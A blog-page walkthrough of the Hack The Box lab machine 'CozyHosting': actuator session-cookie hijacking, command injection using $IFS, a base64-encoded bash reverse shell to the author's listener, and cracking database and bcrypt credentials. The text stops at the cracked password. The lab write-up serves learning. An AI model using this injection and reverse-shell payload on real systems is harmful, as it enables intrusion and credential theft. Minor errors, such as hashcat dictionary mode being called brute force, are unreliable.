<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="rgb(255,255,255)"><title>Hack The Box Machine - CozyHosting &#183; solidshadw</title>
<meta name=title content="Hack The Box Machine - CozyHosting &#183; solidshadw"><script type=text/javascript src=/js/appearance.min.022d0ebc3b46a335eb1c7ef79b7f2de143d7cd5156d433638592ef1ce5f8554e.js integrity="sha256-Ai0OvDtGozXrHH73m38t4UPXzVFW1DNjhZLvHOX4VU4="></script><link type=text/css rel=stylesheet href=/css/main.bundle.min.36c9298d60bbe346189bf45f5fd9db56d6cf6b5ce557efc6cb5eb8e3327e7b98.css integrity="sha256-NskpjWC740YYm/RfX9nbVtbPa1zlV+/Gy1644zJ+e5g="><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.f29ffdffd9ab4cc95250c3c7196b2d5dae8ee6ef0a4139451073f90183ae7e31.js integrity="sha256-8p/9/9mrTMlSUMPHGWstXa6O5u8KQTlFEHP5AYOufjE=" data-copy=Copy data-copied=Copied></script><meta name=description content="
      
        Easy Box # Name Bank OS Linux RELEASE DATE September 2, 2023 DIFFICULTY Easy Port Scan #Output of my naabu scan:
      
    "><link rel=canonical href=https://solidshadw.me/posts/hackthebox/easy/sau/sau/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:title" content="Hack The Box Machine - CozyHosting"><meta property="og:description" content="Easy Box # Name Bank OS Linux RELEASE DATE September 2, 2023 DIFFICULTY Easy Port Scan #Output of my naabu scan:"><meta property="og:type" content="article"><meta property="og:url" content="https://solidshadw.me/posts/hackthebox/easy/sau/sau/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-27T00:00:00+00:00"><meta property="article:modified_time" content="2023-09-27T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack The Box Machine - CozyHosting"><meta name=twitter:description content="Easy Box # Name Bank OS Linux RELEASE DATE September 2, 2023 DIFFICULTY Easy Port Scan #Output of my naabu scan:"><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"Hack The Box Machine - CozyHosting","headline":"Hack The Box Machine - CozyHosting","abstract":"Easy Box # Name Bank OS Linux RELEASE DATE September 2, 2023 DIFFICULTY Easy Port Scan #Output of my naabu scan:","inLanguage":"en","url":"https:\/\/solidshadw.me\/posts\/hackthebox\/easy\/sau\/sau\/","author":{"@type":"Person","name":"solidshadw"},"copyrightYear":"2023","dateCreated":"2023-09-27T00:00:00\u002b00:00","datePublished":"2023-09-27T00:00:00\u002b00:00","dateModified":"2023-09-27T00:00:00\u002b00:00","mainEntityOfPage":"true","wordCount":"1419"}</script><meta name=author content="solidshadw"><link href=https://twitter.com/solidshadw rel=me><script async src="https://www.googletagmanager.com/gtag/js?id=G-9PVW2NWY1T"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-9PVW2NWY1T",{anonymize_ip:!1})}</script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold pe-2 text-primary-600 dark:text-primary-400">&darr;</span>Skip to main content</a></div><header class="py-6 font-semibold text-neutral-900 dark:text-neutral print:hidden sm:py-10"><nav class="flex items-start justify-between sm:items-center"><div class="z-40 flex flex-row items-center"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" rel=me href=/>solidshadw</a></div><label id=menu-button for=menu-controller class="block sm:hidden"><input type=checkbox id=menu-controller class=hidden><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative inline-block align-text-bottom px-1 icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-full h-full m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50"><ul class="flex flex-col w-full px-6 py-6 mx-auto overflow-visible list-none max-w-7xl text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"><li class=mb-1><span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative inline-block align-text-bottom px-1 icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class="mb-1 group"><a href=/posts/ title><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Posts</span></a></li><li class="mb-1 group"><a href=/categories/ title=Categories><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Categories</span></a></li><li class="mb-1 group"><a href=/projects/ title=Projects><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Projects</span></a></li><li class="mb-1 group"><a href=https://github.com/solidshadw title target=_blank><span class="transition-colors group-dark:hover:text-primary-400 group-hover:text-primary-600"><span class="relative inline-block align-text-bottom px-1 icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></li><li class="mb-1 group"><button id=search-button-1 title="Search (/)">
<span class="transition-colors group-dark:hover:text-primary-400 group-hover:text-primary-600"><span class="relative inline-block align-text-bottom px-1 icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span></button></li></ul></div></label><ul class="flex-row hidden list-none text-end sm:flex"><li class="mb-1 group sm:mb-0 sm:me-7 sm:last:me-0"><a href=/posts/ title><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Posts</span></a></li><li class="mb-1 group sm:mb-0 sm:me-7 sm:last:me-0"><a href=/categories/ title=Categories><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Categories</span></a></li><li class="mb-1 group sm:mb-0 sm:me-7 sm:last:me-0"><a href=/projects/ title=Projects><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Projects</span></a></li><li class="mb-1 group sm:mb-0 sm:me-7 sm:last:me-0"><a href=https://github.com/solidshadw title target=_blank><span class="transition-colors group-dark:hover:text-primary-400 group-hover:text-primary-600"><span class="relative inline-block align-text-bottom px-1 icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></li><li class="mb-1 group sm:mb-0 sm:me-7 sm:last:me-0"><button id=search-button-2 title="Search (/)">
<span class="transition-colors group-dark:hover:text-primary-400 group-hover:text-primary-600"><span class="relative inline-block align-text-bottom px-1 icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span></button></li></ul></nav></header><div class="relative flex flex-col grow"><main id=main-content class=grow><article class=max-w-full><header><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Hack The Box Machine - CozyHosting</h1></header><section class="max-w-full mt-6 prose dark:prose-invert"><h3 id=easy-box class="relative group">Easy Box <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#easy-box aria-label=Anchor>#</a></span></h3><p><figure><img class="mx-auto my-0 rounded-md" src=https://www.hackthebox.com/storage/avatars/eaed7cd01e84ef5c6ec7d949d1d61110.png alt=CozyHosting loading=lazy></figure></p><table><thead><tr><th style=text-align:left>Name</th><th style=text-align:left>Bank</th></tr></thead><tbody><tr><td style=text-align:left>OS</td><td style=text-align:left>Linux</td></tr><tr><td style=text-align:left>RELEASE DATE</td><td style=text-align:left>September 2, 2023</td></tr><tr><td style=text-align:left>DIFFICULTY</td><td style=text-align:left><span style=color:green>Easy</span></td></tr></tbody></table><h2 id=port-scan class="relative group">Port Scan <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#port-scan aria-label=Anchor>#</a></span></h2><p>Output of my <a href=https://github.com/projectdiscovery/naabu target=_blank rel=noreferrer>naabu</a> scan:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>naabu -host 10.10.11.230 -p - -rate <span class=m>5000</span> -nmap-cli <span class=s2>&#34;nmap -sV&#34;</span> Â Â Â Â Â Â 30s ï€£ ï” 192.168.0.187 14:09:44  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â __  
</span></span><span class=line><span class=cl>Â ___ Â ___ Â ___ _/ / Â __ __  
</span></span><span class=line><span class=cl>/ _ <span class=se>\/</span> _ <span class=se>\/</span> _ <span class=se>\/</span> _ <span class=se>\/</span> // /  
</span></span><span class=line><span class=cl>/_//_/<span class=se>\_</span>,_/<span class=se>\_</span>,_/_.__/<span class=se>\_</span>,_/  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â projectdiscovery.io  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=o>[</span>INF<span class=o>]</span> Current naabu version 2.1.8 <span class=o>(</span>latest<span class=o>)</span>  
</span></span><span class=line><span class=cl><span class=o>[</span>INF<span class=o>]</span> Running CONNECT scan with non root privileges  
</span></span><span class=line><span class=cl><span class=o>[</span>INF<span class=o>]</span> Found <span class=m>2</span> ports on host 10.10.11.230 <span class=o>(</span>10.10.11.230<span class=o>)</span>  
</span></span><span class=line><span class=cl>10.10.11.230:80  
</span></span><span class=line><span class=cl>10.10.11.230:22  
</span></span><span class=line><span class=cl><span class=o>[</span>INF<span class=o>]</span> Running nmap command: nmap -sV -p 22,80 10.10.11.230  
</span></span><span class=line><span class=cl>Starting Nmap 7.94 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-09-27 14:26 MDT  
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> cozyhosting.htb <span class=o>(</span>10.10.11.230<span class=o>)</span>  
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.067s latency<span class=o>)</span>.  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>PORT Â Â STATE SERVICE VERSION  
</span></span><span class=line><span class=cl>22/tcp open Â ssh Â Â Â Â OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>  
</span></span><span class=line><span class=cl>80/tcp open Â http Â Â Â nginx 1.18.0 <span class=o>(</span>Ubuntu<span class=o>)</span>  
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 7.62 seconds
</span></span></code></pre></div><p>Looks like port 22 and port 80 are opened.</p><h2 id=port-80http class="relative group">Port 80(HTTP) <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#port-80http aria-label=Anchor>#</a></span></h2><p>You need to add <code>cozyhosting.htb</code> to your <code>/etc/hosts</code> to be able to see the site.</p><p>This is what that web server is serving. Looks like a site for web hosting</p><p><figure><img class="mx-auto my-0 rounded-md" src=/20230927143831.png alt=image1 loading=lazy></figure></p><h4 id=directory-enumeration class="relative group">Directory Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#directory-enumeration aria-label=Anchor>#</a></span></h4><p>Running an older tool on it, Dirsearch. I always seem to find interesting things with this tool or what I need usually.</p><p><figure><img class="mx-auto my-0 rounded-md" src=/20230927143927.png alt=image2 loading=lazy></figure>By seeing the name <code>actuator</code> I knew that it had to do with the Spring Boot Framework. Following those paths they had some sensitive data that was redacted, that one that stood out was <code>/actuator/sessions</code> as I looked up their <a href=https://docs.spring.io/spring-boot/docs/current/actuator-api/htmlsingle/#sessions target=_blank rel=noreferrer>documentation</a>, is indeed active user sessions! We can see then on that site or we can retrieve them by making this get request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>curl http://cozyhosting.htb/actuator/sessions<span class=se>\?</span><span class=nv>username</span><span class=o>=</span>kanderson
</span></span></code></pre></div><p><figure><img class="mx-auto my-0 rounded-md" src=/content/posts/hackTheBox/easy/sau/20230928045306.png alt=image3 loading=lazy></figure></p><p>We got the username from the web service when we go to that same path. I found that using the curl command gave the current active sessions, as they seem to either disconnect for inactivity or it is meant to be switched around. That curl command made sure you got the right one every time.</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928144002.png alt=image5 loading=lazy></figure>I knew this would come handy eventually, since they looked like cookies. I found that during the login functionality of the application, that can replace the <code>Cookies</code> header with &ldquo;kanderson&rdquo; cookies. Make sure you change it on <code>/login</code> and <code>/admin</code>.</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928150034.png alt=image6 loading=lazy></figure><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928145940.png alt=image7 loading=lazy></figure></p><p>I then turned on Intercept in Repeater and sent over the login request, but this time I used the session cookie from kanderson that we discover under <code>actuator/sessions</code> and boom we were logged in as kanderson and he looks like he&rsquo;s an admin of the site.</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928145918.png alt=image8 loading=lazy></figure></p><p>There was nothing really interesting on this page, other the automatic patching functionality. Which seems to try to connect to other hosts via ssh for patching.
It took me a while to figure out, but I was able to find that the &ldquo;Username&rdquo; field is vulnerable to command injection.
I came to that conclusion after not sending anything on the username field, it returned this 302 which forwarded to a weird error message.</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928150659.png alt=image9 loading=lazy></figure></p><p>This one was an interesting command injection! I learned about <code>$IFS</code> and how you can leverage it as a white <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#bypass-without-space target=_blank rel=noreferrer>space</a>character. And we know we need spaces because we received an error.</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928161947.png alt=image11 loading=lazy></figure></p><p>After adding the <code>$IFS</code>&mldr;</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928162049.png alt=image10 loading=lazy></figure></p><p>We got a successful command injection! We can now try to get a reverse shell.</p><h5 id=explaining-the-reverse-shell class="relative group">Explaining the Reverse Shell <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#explaining-the-reverse-shell aria-label=Anchor>#</a></span></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=p>;</span>echo<span class=nv>$IFS</span><span class=s2>&#34;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjMvOTAwMSAwPiYx&#34;</span><span class=p>|</span>base64<span class=nv>$IFS</span>-d<span class=nv>$IFS</span><span class=p>|</span>bash<span class=p>;</span>
</span></span></code></pre></div><p>This is your basic base64 encoded reverse shell: <code>/bin/bash -i >& /dev/tcp/&lt;IP ADDRESS>/&lt;PORT> 0>&amp;1</code>. What happened is that I couldn&rsquo;t use the &ldquo;&&rdquo; in the payload, so I had to encoded. Make suure you start your netcat listener to catch the shell <code>nc -lvnp 9001</code>.</p><p>Command explained:</p><ul><li>Echo as Base64 with your IP address and listening port</li><li>Decoded with the command <code>base64 -d</code></li><li>Last, we piped to bash, to make sure it executes in bash</li></ul><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928162936.png alt=image12 loading=lazy></figure></p><h2 id=user-flag class="relative group">User Flag <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#user-flag aria-label=Anchor>#</a></span></h2><p>Once we got that reverse shell, I was running as the user <code>app</code>. I couldn&rsquo;t access the /home/josh folder with that user, which I couldn&rsquo;t retrieve the user flag. I tried LinPeas and found some interesting things but nothing to escalate. Found a postgresql database running.</p><p>When we first got that reverse shell, we landed on <code>/app</code> which contained a file named <code>cloudhosting-0.0.1.jar</code>. A <code>.jar</code> file is &ldquo;is a compressed archive file format used in the Java programming language to package multiple Java class files and associated resources, such as images, audio files, and configuration files, into a single archive.&rdquo;</p><h6 id=decompiling-jar-file class="relative group">Decompiling JAR file <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#decompiling-jar-file aria-label=Anchor>#</a></span></h6><p>I noticed we had python3 in that box, so I just setup a simple http server to pull the file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server <span class=m>8085</span>
</span></span></code></pre></div><p>And then from my machine, we download</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget http://cozyhosting.htb:8085/cloudhosting-0.0.1.jar
</span></span></code></pre></div><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928170643.png alt=image13 loading=lazy></figure></p><p>I used this online JAVA <a href=https://jdec.app/ target=_blank rel=noreferrer>decompiler</a>. Nice an easy or you can also use <a href=http://java-decompiler.github.io/ target=_blank rel=noreferrer>jd-gui</a>which can be installed in kali or comes by default.</p><p>We found credentials for the postgresql database on the file <code>BOOT-INF/classes/application.properties</code></p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928171253.png alt=image15 loading=lazy></figure></p><p>Username:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>postgres
</span></span></code></pre></div><p>Password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Vg<span class=p>&amp;</span>nvzAQ7XxR
</span></span></code></pre></div><p>We can now try to login to the database. As you remember there were only 2 open ports(80 and 22), so this command has to be run in our rev shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>psql -U postgres -W -h localhost -d cozyhosting
</span></span></code></pre></div><ul><li><code>psql</code>: manages and interacts with PostgreSQL databases.</li><li><code>-U</code>: specifies the db username to connect to the database</li><li><code>-W</code>: prompts the user for the password before connecting to db</li><li><code>-h</code>: specifies the hostname of the PostgreSQL server. In this case, it&rsquo;s connecting to the local machine (localhost).</li><li><code>-d </code>: name of the database (<code>-d</code>) to connect to.</li></ul><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928171957.png alt=image16 loading=lazy></figure></p><ul><li><code>\list:</code>displays a list of all existing database names.</li><li><code>\d</code>: Lists the database tables.</li></ul><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928172044.png alt=image17 loading=lazy></figure></p><p>Looks like we got a bcrypt hash.</p><h5 id=cracking-the-hash class="relative group">Cracking the Hash <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#cracking-the-hash aria-label=Anchor>#</a></span></h5><p>Save the hash to a file and then we will be using <code>hashcat</code> and the <code>rockyou</code> worldlist to crack this hash and get our password.</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928172440.png alt=iamge19 loading=lazy></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hashcat -a <span class=m>0</span> -m <span class=m>3200</span> hashAdmin.txt rockyou.txt
</span></span></code></pre></div><ul><li><code>hashcat</code>: This is the command-line executable for Hashcat, the password cracking tool.</li><li><code>-a 0</code>: This option specifies the attack mode. In this case, <code>-a 0</code> indicates a &ldquo;straight&rdquo; or &ldquo;brute-force&rdquo; attack mode. In a brute-force attack, Hashcat tries all possible combinations of characters to find the correct password.</li><li><code>-m 3200</code>: This option specifies the hash mode. Hashcat supports various hash algorithms, and <code>-m</code> is used to specify the mode for the hash algorithm being targeted. In this case, <code>-m 3200</code> corresponds to the bcrypt hash algorithm, which is commonly used for storing password hashes securely. Hashcat will attempt to crack bcrypt-hashed passwords.</li><li><code>hashAdmin.txt</code>: This is the name of the file that contains the hashed passwords you want to crack. Hashcat will read these hashes from this file and attempt to find the corresponding plaintext passwords.</li><li><code>rockyou.txt</code>: This is the name of the wordlist file that Hashcat will use for the brute-force attack. Hashcat will try all the passwords in the &ldquo;rockyou.txt&rdquo; wordlist to see if any of them match the hashed passwords in &ldquo;hashAdmin.txt.&rdquo;</li></ul><p>I don&rsquo;t have a great GPU, so it took 3 min to crack it.</p><p><figure><img class="mx-auto my-0 rounded-md" src=/assets/img/20230928173107.png alt=image20 loading=lazy></figure></p><p>Password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>manchesterunited
